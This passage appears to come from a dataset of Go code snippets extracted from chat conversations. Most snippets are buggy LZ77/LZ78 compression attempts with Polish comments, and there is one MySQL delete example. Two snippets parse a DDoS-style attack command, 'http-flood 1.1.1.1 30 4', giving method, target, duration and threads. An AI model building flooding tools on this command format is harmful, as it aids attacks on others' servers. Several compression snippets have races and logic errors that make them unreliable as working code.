    "code": "start := time.Now()\n\nerr := Compress(inputFile, outputFile)\nif err != nil {\n    fmt.Println(\"Blad podczas kompresowania pliku:\", err)\n    return\n}\n\nelapsed := time.Since(start)\nfmt.Println(\"Czas kompresji:\", elapsed)",
    "filename": "b10ab4a472d5e3595218ff4b7a1e763a_0.go"
  },
  {
    "conversation_hash": "b10ab4a472d5e3595218ff4b7a1e763a",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bytes\"\n\t\"encoding/binary\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"os\"\n\t\"runtime\"\n\t\"sync\"\n\t\"time\"\n)\n\ntype DictionaryEntry struct {\n\tSuffix   byte\n\tNextCode uint32\n}\n\nfunc Compress(inputFilePath, outputFilePath string) error {\n\t// Odczytaj plik wejściowy\n\tinputData, err := ioutil.ReadFile(inputFilePath)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t// Inicjalizuj słownik\n\tdictionary := make(map[uint32]DictionaryEntry)\n\tmutex := sync.Mutex{} // Dodaj mutex do synchronizacji dostępu do słownika\n\n\t// Inicjalizuj wynikowy bufor\n\tvar result bytes.Buffer\n\n\t// Zmienna pomocnicza\n\tprefix := uint32(0)\n\n\t// Iteruj po każdym bajcie danych wejściowych\n\ttotalBytes := len(inputData)\n\tcompressedBytes := 0\n\n\t// Pobierz liczbę dostępnych rdzeni procesora\n\tnumCPU := runtime.NumCPU()\n\n\t// Utwórz semafor, aby ograniczyć liczbę gorutyn\n\tsemaphore := make(chan struct{}, numCPU)\n\n\twg := sync.WaitGroup{}\n\twg.Add(totalBytes)\n\n\t// Iteruj po każdym symbolu danych wejściowych\n\tfor _, symbol := range inputData {\n\t\t// Wykorzystaj gorutynę do kompresji symbolu\n\t\tgo func(symbol byte) {\n\t\t\t// Ogranicz liczbę jednocześnie działających gorutyn\n\t\t\tsemaphore <- struct{}{}\n\n\t\t\tdefer func() {\n\t\t\t\t<-semaphore\n\t\t\t\twg.Done()\n\t\t\t}()\n\n\t\t\tsuffix := symbol // Aktualny sufiks to aktualny symbol\n\n\t\t\t// Sprawdz czy rozmiar słownika przekroczył limit\n\t\t\tmutex.Lock()\n\t\t\tif len(dictionary) >= 259 {\n\t\t\t\tfmt.Println(\"Słownik został zapełniony. Nie można skompresować ciągu dalej.\")\n\t\t\t\tmutex.Unlock()\n\t\t\t\treturn\n\t\t\t}\n\n\t\t\t// Szukaj w słowniku kombinacji prefiksu i sufiksu\n\t\t\tentry, exists := dictionary[prefix]\n\t\t\tfor exists && entry.Suffix != suffix {\n\t\t\t\tprefix = entry.NextCode\n\t\t\t\tentry, exists = dictionary[prefix]\n\t\t\t}\n\n\t\t\t// Jezeli kombinacja istnieje w słowniku, przesuń się do jej indeksu\n\t\t\tif exists && entry.Suffix == suffix {\n\t\t\t\tprefix = entry.NextCode\n\t\t\t} else {\n\t\t\t\t// W przeciwnym razie dodaj nową kombinację do słownika\n\t\t\t\tdictionary[prefix] = DictionaryEntry{Suffix: suffix, NextCode: uint32(len(dictionary))}\n\t\t\t\tmutex.Unlock()\n\t\t\t\tbinary.Write(&result, binary.LittleEndian, prefix)\n\t\t\t\tbinary.Write(&result, binary.LittleEndian, suffix)\n\t\t\t\tmutex.Lock()\n\t\t\t\tprefix = uint32(suffix)\n\t\t\t}\n\n\t\t\tcompressedBytes++\n\n\t\t\tprogress := float64(compressedBytes) / float64(totalBytes) * 100\n\t\t\tfmt.Printf(\"Kompresowanie w toku... %.2f%%\\r\", progress)\n\t\t\tmutex.Unlock()\n\t\t}(symbol)\n\t}\n\n\t// Czekaj na zakończenie wszystkich gorutyn\n\twg.Wait()\n\n\t// Zapisz wynik do pliku wyjściowego\n\toutputFile, err := os.Create(outputFilePath)\n\tif err != nil {\n\t\treturn err\n\t}\n\tdefer outputFile.Close()\n\n\t_, err = outputFile.Write(result.Bytes())\n\tif err != nil {\n\t\treturn err\n\t}\n\n\terr = outputFile.Sync() // Dodaj synchronizację, aby zagwarantować zapis do pliku\n\tif err != nil {\n\t\treturn err\n\t}\n\n\tfmt.Println(\"\\nKompresja zakończona.\")\n\treturn nil\n}\n\nfunc main() {\n\t// Pobierz argumenty z wiersza poleceń\n\targs := os.Args[1:]\n\n\tif len(args) != 3 || (args[0] != \"-c\" && args[0] != \"-d\") {\n\t\tfmt.Println(\"Sposób użycia: lz78 -c/-d plik_wejściowy plik_wyjściowy\")\n\t\treturn\n\t}\n\n\toperation := args[0]\n\tinputFile := args[1]\n\toutputFile := args[2]\n\n\tstart := time.Now()\n\n\tswitch operation {\n\tcase \"-c\":\n\t\terr := Compress(inputFile, outputFile)\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Błąd podczas kompresowania pliku:\", err)\n\t\t\treturn\n\t\t}\n\t\telapsed := time.Since(start)\n\t\tfmt.Println(\"Plik został skompresowany do:\", outputFile)\n\t\tfmt.Println(\"Czas kompresji:\", elapsed)\n\tcase \"-d\":\n\t\t// Dekodowanie nie zostało jeszcze zaimplementowane\n\t\tfmt.Println(\"Dekodowanie nie jest jeszcze zaimplementowane\")\n\tdefault:\n\t\tfmt.Println(\"Nieznane działanie:\", operation)\n\t}\n}",
    "filename": "b10ab4a472d5e3595218ff4b7a1e763a_1.go"
  },
  {
    "conversation_hash": "b10ab4a472d5e3595218ff4b7a1e763a",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "// W przeciwnym razie dodaj nową kombinację do słownika\ndictionary[prefix] = DictionaryEntry{Suffix: suffix, NextCode: uint32(len(dictionary))}\nbinary.Write(&result, binary.LittleEndian, prefix)\nbinary.Write(&result, binary.LittleEndian, suffix)\nprefix = uint32(suffix)\n\n// Zapisz wynik do pliku wyjściowego\n_, err = outputFile.Write(result.Bytes())\nif err != nil {\n    return err\n}\n\nerr = outputFile.Sync()\nif err != nil {\n    return err\n}\n\n// Wyślij sygnał o maksymalnej kompresji\nfmt.Println(\"Osiągnięto maksymalną kompresję. Zapisuję do pliku wynikowego.\")\nbreak",
    "filename": "b10ab4a472d5e3595218ff4b7a1e763a_2.go"
  },
  {
    "conversation_hash": "d0414257e82d865fc7c1e97f5c7b66e9",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func findLongestMatch(inputData []byte, pos uint16, dictionary map[uint16]DictionaryEntry) (uint16, byte) {\n    maxMatchLen := uint16(0)\n    maxMatchPos := uint16(0)\n    nextSymbol := byte(0)\n\n    // Iteruj po wszystkich kombinacjach w slowniku\n    for dictPos, entry := range dictionary {\n        if entry.Prefix == pos && entry.Suffix > maxMatchLen {\n            maxMatchLen = entry.Suffix\n            maxMatchPos = dictPos\n            nextSymbol = inputData[pos+maxMatchLen]\n        }\n    }\n\n    return maxMatchPos, nextSymbol\n}",
    "filename": "d0414257e82d865fc7c1e97f5c7b66e9_0.go"
  },
  {
    "conversation_hash": "d0414257e82d865fc7c1e97f5c7b66e9",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func findLongestMatch(inputData []byte, pos uint16, dictionary map[uint16]DictionaryEntry) (uint16, byte) {\n    maxMatchLen := uint16(0)\n    maxMatchPos := uint16(0)\n    nextSymbol := byte(0)\n\n    // Iteruj po wszystkich kombinacjach w slowniku\n    for dictPos, entry := range dictionary {\n        if entry.Prefix == pos && uint16(entry.Suffix) > maxMatchLen {\n            maxMatchLen = uint16(entry.Suffix)\n            maxMatchPos = dictPos\n            nextSymbol = inputData[pos+maxMatchLen]\n        }\n    }\n\n    return maxMatchPos, nextSymbol\n}",
    "filename": "d0414257e82d865fc7c1e97f5c7b66e9_1.go"
  },
  {
    "conversation_hash": "d0414257e82d865fc7c1e97f5c7b66e9",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "func Compress(inputFilePath, outputFilePath string) error {\n    // Odczytaj plik wejściowy\n    inputData, err := ioutil.ReadFile(inputFilePath)\n    if err != nil {\n        return err\n    }\n\n    // Inicjalizuj słownik\n    dictionary := make(map[uint16]DictionaryEntry)\n\n    // Inicjalizuj wynikowy bufor\n    var result bytes.Buffer\n\n    // Zmienna pomocnicza\n    pos := uint16(0)\n\n    // Iteruj po każdym bajcie danych wejściowych\n    totalBytes := len(inputData)\n    compressedBytes := 0\n\n    // Iteruj po każdym symbolu danych wejściowych\n    for pos < uint16(totalBytes) {\n        // Znajdź najdłuższą kombinację powtarzających się symboli\n        prefixPos, suffix := findLongestMatch(inputData, pos, dictionary)\n\n        // Dodaj kombinację do słownika\n        dictionary[pos] = DictionaryEntry{Prefix: prefixPos, Suffix: suffix, NextPos: pos + 1}\n\n        // Zapisz wynik do bufora\n        binary.Write(&result, binary.LittleEndian, prefixPos)\n        result.WriteByte(suffix)\n\n        // Przesuń pozycję w danych wejściowych\n        pos++\n\n        compressedBytes++\n\n        progress := float64(compressedBytes) / float64(totalBytes) * 100\n        fmt.Printf(\"Kompresowanie w toku… %.2f%%\\r\", progress)\n    }\n\n    // Otwórz plik wyjściowy\n    outputFile, err := os.Create(outputFilePath)\n    if err != nil {\n        return err\n    }\n    defer outputFile.Close()\n\n    // Zapisz zawartość bufora do pliku wyjściowego\n    _, err = outputFile.Write(result.Bytes())\n    if err != nil {\n        return err\n    }\n\n    fmt.Println(\"\\nKompresja zakończona.\")\n    return nil\n}",
    "filename": "d0414257e82d865fc7c1e97f5c7b66e9_2.go"
  },
  {
    "conversation_hash": "d0414257e82d865fc7c1e97f5c7b66e9",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "outputFile, err := os.Create(outputFilePath)\nif err != nil {\n    return err\n}\ndefer outputFile.Close()",
    "filename": "d0414257e82d865fc7c1e97f5c7b66e9_3.go"
  },
  {
    "conversation_hash": "d0414257e82d865fc7c1e97f5c7b66e9",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "...\n// Odczytaj plik wejściowy\ninputData, err := ioutil.ReadFile(inputFilePath)\nif err != nil {\n    return err\n}\n...",
    "filename": "d0414257e82d865fc7c1e97f5c7b66e9_4.go"
  },
  {
    "conversation_hash": "a7e88cbefc45361363a904e891eb2f37",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bytes\"\n\t\"encoding/binary\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"os\"\n\t\"time\"\n)\n\ntype DictionaryEntry struct {\n\tPrefix  uint16\n\tSuffix  byte\n\tNextPos uint16\n}\n\nfunc Compress(inputFilePath, outputFilePath string) error {\n\t// Odczytaj plik wejściowy\n\tinputData, err := ioutil.ReadFile(inputFilePath)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t// Inicjalizuj słownik\n\tdictionary := make(map[uint16]DictionaryEntry)\n\n\t// Inicjalizuj wynikowy bufor\n\tvar result bytes.Buffer\n\n\t// Zmienna pomocnicza\n\tpos := uint16(0)\n\n\t// Iteruj po każdym bajcie danych wejściowych\n\ttotalBytes := len(inputData)\n\tcompressedBytes := 0\n\n\t// Dodaj początkowe wpisy do słownika\n\tfor i := 0; i < 256; i++ {\n\t\tdictionary[uint16(i)] = DictionaryEntry{Prefix: 0, Suffix: byte(i), NextPos: uint16(i) + 1}\n\t}\n\n\t// Iteruj po każdym symbolu danych wejściowych\n\tfor pos < uint16(totalBytes) {\n\t\t// Znajdź najdłuższą kombinację powtarzających się symboli\n\t\tprefixPos, suffix := findLongestMatch(inputData, pos, dictionary)\n\n\t\t// Dodaj kombinację do słownika\n\t\tdictionary[pos] = DictionaryEntry{Prefix: prefixPos, Suffix: suffix, NextPos: pos + 1}\n\n\t\t// Zapisz wynik do bufora\n\t\tbinary.Write(&result, binary.LittleEndian, prefixPos)\n\t\tresult.WriteByte(suffix)\n\n\t\t// Przesuń pozycję w danych wejściowych\n\t\tpos++\n\n\t\tcompressedBytes++\n\n\t\tprogress := float64(compressedBytes) / float64(totalBytes) * 100\n\t\tfmt.Printf(\"Kompresowanie w toku... %.2f%%\\r\", progress)\n\t}\n\n\t// Otwórz plik wyjściowy\n\toutputFile, err := os.Create(outputFilePath)\n\tif err != nil {\n\t\treturn err\n\t}\n\tdefer outputFile.Close()\n\n\t// Zapisz zawartość bufora do pliku wyjściowego\n\t_, err = outputFile.Write(result.Bytes())\n\tif err != nil {\n\t\treturn err\n\t}\n\n\tfmt.Println(\"\\nKompresja zakończona.\")\n\treturn nil\n}\n\nfunc Decompress(inputFilePath, outputFilePath string) error {\n\t// Odczytaj plik wejściowy\n\tinputData, err := ioutil.ReadFile(inputFilePath)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t// Inicjalizuj słownik\n\tdictionary := make(map[uint16]DictionaryEntry)\n\n\t// Inicjalizuj bufor do przechowywania zdekodowanych danych\n\tvar result bytes.Buffer\n\n\t// Iteruj po każdych trzech bajtach danych wejściowych\n\tfor i := 0; i+2 < len(inputData); i += 3 {\n\t\tprefixPosBytes := inputData[i : i+2]\n\t\tsuffixByte := inputData[i+2]\n\n\t\tvar prefixPos uint16\n\n\t\t// Odczytaj wartość pozycji prefiksu\n\t\terr := binary.Read(bytes.NewReader(prefixPosBytes), binary.LittleEndian, &prefixPos)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\n\t\t// Sprawdź czy kombinacja istnieje w słowniku\n\t\tentry, exists := dictionary[prefixPos]\n\t\tif exists {\n\t\t\t// Jeśli kombinacja istnieje, zapisz sufiks jako wynik dekodowania\n\t\t\tresult.WriteByte(entry.Suffix)\n\n\t\t\t// Dodaj nową kombinację do słownika\n\t\t\tdictionary[uint16(len(dictionary))] = DictionaryEntry{Prefix: prefixPos, Suffix: entry.Suffix, NextPos: uint16(len(dictionary))}\n\t\t} else {\n\t\t\t// Jeśli kombinacja nie istnieje, dodaj nową kombinację do słownika na podstawie prefiksu i sufiksu\n\t\t\tdictionary[uint16(len(dictionary))] = DictionaryEntry{Prefix: prefixPos, Suffix: suffixByte, NextPos: uint16(len(dictionary))}\n\t\t\tresult.WriteByte(suffixByte)\n\t\t}\n\t}\n\n\t// Zapisz wynik do pliku wyjściowego\n\terr = ioutil.WriteFile(outputFilePath, result.Bytes(), 0644)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\tfmt.Println(\"Dekompresja zakończona.\")\n\treturn nil\n}\n\nfunc findLongestMatch(inputData []byte, pos uint16, dictionary map[uint16]DictionaryEntry) (uint16, byte) {\n\tmaxMatchLen := uint16(0)\n\tmaxMatchPos := uint16(0)\n\tnextSymbol := byte(0)\n\n\t// Iteruj po wszystkich kombinacjach w słowniku\n\tfor dictPos, entry := range dictionary {\n\t\tif entry.Prefix == pos && uint16(entry.Suffix) > maxMatchLen {\n\t\t\tmaxMatchLen = uint16(entry.Suffix)\n\t\t\tmaxMatchPos = dictPos\n\t\t\tnextSymbol = inputData[pos+maxMatchLen]\n\t\t}\n\t}\n\n\treturn maxMatchPos, nextSymbol\n}\n\nfunc main() {\n\t// Pobierz argumenty z wiersza poleceń\n\targs := os.Args[1:]\n\n\tif len(args) != 3 || (args[0] != \"-c\" && args[0] != \"-d\") {\n\t\tfmt.Println(\"Sposób użycia: lz77 -c/-d plik_wejściowy plik_wyjściowy\")\n\t\treturn\n\t}\n\n\toperation := args[0]\n\tinputFile := args[1]\n\toutputFile := args[2]\n\n\tstart := time.Now()\n\n\tswitch operation {\n\tcase \"-c\":\n\t\terr := Compress(inputFile, outputFile)\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Błąd podczas kompresowania pliku:\", err)\n\t\t\treturn\n\t\t}\n\t\telapsed := time.Since(start)\n\t\tfmt.Println(\"Plik został skompresowany do:\", outputFile)\n\t\tfmt.Println(\"Czas kompresji:\", elapsed)\n\tcase \"-d\":\n\t\terr := Decompress(inputFile, outputFile)\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Błąd podczas dekompresowania pliku:\", err)\n\t\t\treturn\n\t\t}\n\t\telapsed := time.Since(start)\n\t\tfmt.Println(\"Plik został zdekompresowany do:\", outputFile)\n\t\tfmt.Println(\"Czas dekompresji:\", elapsed)\n\tdefault:\n\t\tfmt.Println(\"Nieznane działanie:\", operation)\n\t}\n}",
    "filename": "a7e88cbefc45361363a904e891eb2f37_0.go"
  },
  {
    "conversation_hash": "42a917efc90d547c24678de125f7d7db",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func Compress(inputFilePath, outputFilePath string) error {\n\t// Odczytaj plik wejsciowy\n\tinputData, err := ioutil.ReadFile(inputFilePath)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t// Usuń puste linie i spacje\n\tinputData = bytes.TrimSpace(inputData)\n\n\t// Inicjalizuj slownik\n\tdictionary := make(map[uint16]DictionaryEntry)\n\n\t// Inicjalizuj wynikowy bufor\n\tvar result bytes.Buffer\n\n\t// ...\n}",
    "filename": "42a917efc90d547c24678de125f7d7db_0.go"
  },
  {
    "conversation_hash": "42a917efc90d547c24678de125f7d7db",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func Decompress(inputFilePath, outputFilePath string) error {\n\t// Odczytaj plik wejsciowy\n\tinputData, err := ioutil.ReadFile(inputFilePath)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t// Inicjalizuj slownik\n\tdictionary := make(map[uint16]DictionaryEntry)\n\n\t// Inicjalizuj bufor do przechowywania zdekodowanych danych\n\tvar result bytes.Buffer\n\n\t// Iteruj po kazdych dwoch bajtach danych wejsciowych\n\tfor i := 0; i+1 < len(inputData); i += 2 {\n\t\tprefixPosBytes := inputData[i : i+2]\n\n\t\t// ...\n\t}\n}",
    "filename": "42a917efc90d547c24678de125f7d7db_1.go"
  },
  {
    "conversation_hash": "42a917efc90d547c24678de125f7d7db",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "func Decompress(inputFilePath, outputFilePath string) error {\n\t// Odczytaj plik wejsciowy\n\tinputData, err := ioutil.ReadFile(inputFilePath)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t// Inicjalizuj slownik\n\tdictionary := make(map[uint16]DictionaryEntry)\n\n\t// Inicjalizuj bufor do przechowywania zdekodowanych danych\n\tvar result bytes.Buffer\n\n\t// Inicjalizuj zmienną suffixByte\n\tvar suffixByte byte\n\n\t// Iteruj po kazdych dwoch bajtach danych wejsciowych\n\tfor i := 0; i+1 < len(inputData); i += 2 {\n\t\tprefixPosBytes := inputData[i : i+2]\n\t\t\n\t\t// Odczytaj wartosc pozycji prefiksu\n\t\terr := binary.Read(bytes.NewReader(prefixPosBytes), binary.LittleEndian, &prefixPos)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\n\t\t// ...\n\t}\n}",
    "filename": "42a917efc90d547c24678de125f7d7db_2.go"
  },
  {
    "conversation_hash": "03fb706988dc0cdc9c3d2a509067ec83",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "import (\n    \"database/sql\"\n    \"fmt\"\n\n    _ \"github.com/go-sql-driver/mysql\"\n)\n\nfunc main() {\n    // 建立数据库连接\n    db, err := sql.Open(\"mysql\", \"user:password@tcp(localhost:3306)/database\")\n    if err != nil {\n        fmt.Println(\"数据库连接失败:\", err)\n        return\n    }\n    defer db.Close()\n\n    // 执行删除操作\n    stmt, err := db.Prepare(\"DELETE FROM your_table WHERE id = ?\")\n    if err != nil {\n        fmt.Println(\"删除操作准备失败:\", err)\n        return\n    }\n    defer stmt.Close()\n\n    _, err = stmt.Exec(1) // 传入要删除的记录的ID\n    if err != nil {\n        fmt.Println(\"删除记录失败:\", err)\n        return\n    }\n\n    fmt.Println(\"记录删除成功\")\n}",
    "filename": "03fb706988dc0cdc9c3d2a509067ec83_0.go"
  },
  {
    "conversation_hash": "fc64faed534c0a455ac932241f0c0e6f",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"strconv\"\n\t\"strings\"\n)\n\nfunc parseCommand(command string) map[string]interface{} {\n\tcommandSplit := strings.Split(command, \" \")\n\tmethod := commandSplit[0]\n\ttarget := commandSplit[1]\n\tduration, err := strconv.Atoi(commandSplit[2])\n\tif err != nil {\n\t\tfmt.Println(err)\n\t}\n\tthreads, err := strconv.Atoi(commandSplit[3])\n\tif err != nil {\n\t\tfmt.Println(err)\n\t}\n\n\tdata := map[string]interface{}{\n\t\t\"method\":   method,\n\t\t\"target\":   target,\n\t\t\"duration\": duration,\n\t\t\"threads\":  threads,\n\t}\n\n\treturn data\n}\n\nfunc main() {\n\tcommand := \"http-flood 1.1.1.1 30 4\"\n\tdata := parseCommand(command)\n\tfmt.Println(data)\n}",
    "filename": "fc64faed534c0a455ac932241f0c0e6f_0.go"
  },
  {
    "conversation_hash": "fc64faed534c0a455ac932241f0c0e6f",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"strconv\"\n\t\"strings\"\n)\n\nfunc parseCommand(command string) map[string]interface{} {\n\tcommandSplit := strings.Split(command, \" \")\n\tmethod := commandSplit[0]\n\ttarget := commandSplit[1]\n\tduration, err := strconv.Atoi(commandSplit[2])\n\tif err != nil {\n\t\tfmt.Println(err)\n\t}\n\tthreads, err := strconv.Atoi(commandSplit[3])\n\tif err != nil {\n\t\tfmt.Println(err)\n\t}\n\n\tdata := map[string]interface{}{\n\t\t\"method\":   method,\n\t\t\"target\":   target,\n\t\t\"duration\": duration,\n\t\t\"threads\":  threads,\n\t}\n\n\treturn data\n}\n\nfunc main() {\n\tcommand := \"http-flood 1.1.1.1 30 4\"\n\tdata := parseCommand(command)\n\tfmt.Println(data)\n}",
    "filename": "fc64faed534c0a455ac932241f0c0e6f_1.go"
  },
  {
    "conversation_hash": "3a39654209bd5e69f1ca846cefd71671",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"io\"\n\t\"log\"\n\t\"os\"\n)\n\nvar (\n\twindowSize, bufferSize int = 12, 5 // rozmiar okna przesuwnego i bufora\n)\n\ntype triplet struct {\n\toffset, length int\n\tnextByte       byte\n}\n\n// Funkcja do kompresji algorytmem LZ77\nfunc compress(input []byte) []triplet {\n\tvar result []triplet\n\n\tfor i := 0; i < len(input); {\n\t\twindow := max(i-windowSize, 0)\n\t\tbufEnd := min(i+bufferSize, len(input))\n\n\t\tmatchPos, matchLen := findLongestMatch(input[window:i], input[i:bufEnd])\n\t\tif matchLen == 0 {\n\t\t\tresult = append(result, triplet{0, 0, input[i]})\n\t\t\ti++\n\t\t} else {\n\t\t\tresult = append(result, triplet{i - matchPos, matchLen, input[i+matchLen]})\n\t\t\ti += matchLen + 1\n\t\t}\n\t}\n\n\treturn result\n}\n\n// Funkcja do dekompresji algorytmem LZ77\nfunc decompress(triplets []triplet) []byte {\n\tvar result []byte\n\n\tfor _, t := range triplets {\n\t\twindow := max(len(result)-t.offset, 0)\n\n\t\tstart := len(result) - t.offset\n\t\tend := start + t.length\n\n\t\tfor i := start; i < end; i++ {\n\t\t\tresult = append(result, result[i])\n\t\t}\n\n\t\tresult = append(result, t.nextByte)\n\t}\n\n\treturn result\n}\n\n// Znajduje najdłuższe dopasowanie dla danego fragmentu wejściowego względem okna przesuwnego\nfunc findLongestMatch(window, buffer []byte) (int, int) {\n\tmatchPos, matchLen := 0, 0\n\n\tfor i := 0; i < len(window); i++ {\n\t\tfor j := 0; j < len(buffer); j++ {\n\t\t\tk := 0\n\t\t\tfor i+k < len(window) && j+k < len(buffer) && window[i+k] == buffer[j+k] {\n\t\t\t\tk++\n\t\t\t}\n\n\t\t\tif k > matchLen {\n\t\t\t\tmatchPos, matchLen = i, k\n\t\t\t}\n\t\t}\n\t}\n\n\treturn matchPos, matchLen\n}\n\n// Funkcje pomocnicze do obliczania maksimum i minimum\nfunc max(a, b int) int {\n\tif a > b {\n\t\treturn a\n\t}\n\treturn b\n}\n\nfunc min(a, b int) int {\n\tif a < b {\n\t\treturn a\n\t}\n\treturn b\n}\n\nfunc main() {\n\t// Pobierz argumenty z linii poleceń (nazwa pliku wejściowego i wyjściowego)\n\targs := os.Args[1:]\n\tif len(args) != 2 {\n\t\tlog.Fatal(\"Podaj nazwę pliku wejściowego i wyjściowego\")\n\t}\n\n\tinputFile, err := os.Open(args[0])\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer inputFile.Close()\n\n\toutputFile, err := os.Create(args[1])\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer outputFile.Close()\n\n\t// Odczytaj dane z pliku wejściowego\n\tinputData := make([]byte, 0)\n\tbuffer := make([]byte, 1024)\n\tfor {\n\t\tn, err := inputFile.Read(buffer)\n\t\tif err == io.EOF {\n\t\t\tbreak\n\t\t}\n\t\tinputData = append(inputData, buffer[:n]...)\n\t}\n\n\t// Kompresuj dane\n\tcompressedData := compress(inputData)\n\n\t// Zapisz skompresowane dane do pliku wyjściowego (jako dane binarne)\n\tfor _, t := range compressedData {\n\t\terr := binary.Write(outputFile, binary.LittleEndian, t)\n\t\tif err != nil {\n\t\t\tlog.Fatal(err)\n\t\t}\n\t}\n}",
    "filename": "3a39654209bd5e69f1ca846cefd71671_0.go"
  },
  {
    "conversation_hash": "3a39654209bd5e69f1ca846cefd71671",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/binary\"\n\t\"io\"\n\t\"log\"\n\t\"os\"\n)\n\nvar (\n\twindowSize, bufferSize int = 12, 5 // rozmiar okna przesuwnego i bufora\n)\n\ntype triplet struct {\n\toffset, length int\n\tnextByte       byte\n}\n\n// Funkcja do kompresji algorytmem LZ77\nfunc compress(input []byte) []triplet {\n\tvar result []triplet\n\n\tfor i := 0; i < len(input); {\n\t\twindow := max(i-windowSize, 0)\n\t\tbufEnd := min(i+bufferSize, len(input))\n\n\t\tmatchPos, matchLen := findLongestMatch(input[window:i], input[i:bufEnd])\n\t\tif matchLen == 0 {\n\t\t\tresult = append(result, triplet{0, 0, input[i]})\n\t\t\ti++\n\t\t} else {\n\t\t\tresult = append(result, triplet{i - matchPos, matchLen, input[i+matchLen]})\n\t\t\ti += matchLen + 1\n\t\t}\n\t}\n\n\treturn result\n}\n\n// Funkcja do dekompresji algorytmem LZ77\nfunc decompress(triplets []triplet) []byte {\n\tvar result []byte\n\n\tfor _, t := range triplets {\n\t\twindow := max(len(result)-t.offset, 0)\n\n\t\tstart := len(result) - t.offset\n\t\tend := start + t.length\n\n\t\tfor i := start; i < end; i++ {\n\t\t\tresult = append(result, result[i])\n\t\t}\n\n\t\tresult = append(result, t.nextByte)\n\t}\n\n\treturn result\n}\n\n// Znajduje najdłuższe dopasowanie dla danego fragmentu wejściowego względem okna przesuwnego\nfunc findLongestMatch(window, buffer []byte) (int, int) {\n\tmatchPos, matchLen := 0, 0\n\n\tfor i := 0; i < len(window); i++ {\n\t\tfor j := 0; j < len(buffer); j++ {\n\t\t\tk := 0\n\t\t\tfor i+k < len(window) && j+k < len(buffer) && window[i+k] == buffer[j+k] {\n\t\t\t\tk++\n\t\t\t}\n\n\t\t\tif k > matchLen {\n\t\t\t\tmatchPos, matchLen = i, k\n\t\t\t}\n\t\t}\n\t}\n\n\treturn matchPos, matchLen\n}\n\n// Funkcje pomocnicze do obliczania maksimum i minimum\nfunc max(a, b int) int {\n\tif a > b {\n\t\treturn a\n\t}\n\treturn b\n}\n\nfunc min(a, b int) int {\n\tif a < b {\n\t\treturn a\n\t}\n\treturn b\n}\n\nfunc main() {\n\t// Pobierz argumenty z linii poleceń (nazwa pliku wejściowego i wyjściowego)\n\targs := os.Args[1:]\n\tif len(args) != 2 {\n\t\tlog.Fatal(\"Podaj nazwę pliku wejściowego i wyjściowego\")\n\t}\n\n\tinputFile, err := os.Open(args[0])\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer inputFile.Close()\n\n\toutputFile, err := os.Create(args[1])\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer outputFile.Close()\n\n\t// Odczytaj dane z pliku wejściowego\n\tinputData := make([]byte, 0)\n\tbuffer := make([]byte, 1024)\n\tfor {\n\t\tn, err := inputFile.Read(buffer)\n\t\tif err == io.EOF {\n\t\t\tbreak\n\t\t}\n\t\tinputData = append(inputData, buffer[:n]...)\n\t}\n\n\t// Kompresuj dane\n\tcompressedData := compress(inputData)\n\n\t// Zapisz skompresowane dane do pliku wyjściowego (jako dane binarne)\n\tfor _, t := range compressedData {\n\t\tbinary.Write(outputFile, binary.LittleEndian, t)\n\t}\n}",
    "filename": "3a39654209bd5e69f1ca846cefd71671_2.go"
  },
  {
    "conversation_hash": "3a39654209bd5e69f1ca846cefd71671",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/binary\"\n\t\"io\"\n\t\"log\"\n\t\"os\"\n)\n\nvar (\n\tbufferSize int = 5 // rozmiar bufora\n)\n\ntype triplet struct {\n\toffset, length int\n\tnextByte       byte\n}\n\n// Funkcja do kompresji algorytmem LZ77\nfunc compress(input []byte) []triplet {\n\tvar result []triplet\n\n\tfor i := 0; i < len(input); {\n\t\tbufEnd := min(i+bufferSize, len(input))\n\n\t\tmatchPos, matchLen := findLongestMatch(input[i:bufEnd])\n\t\tif matchLen == 0 {\n\t\t\tresult = append(result, triplet{0, 0, input[i]})\n\t\t\ti++\n\t\t} else {\n\t\t\tresult = append(result, triplet{matchPos, matchLen, input[i+matchLen]})\n\t\t\ti += matchLen + 1\n\t\t}\n\t}\n\n\treturn result\n}\n\n// Funkcja do dekompresji algorytmem LZ77\nfunc decompress(triplets []triplet) []byte {\n\tvar result []byte\n\n\tfor _, t := range triplets {\n\t\tstart := max(len(result)-t.offset, 0)\n\t\tend := start + t.length\n\n\t\tfor i 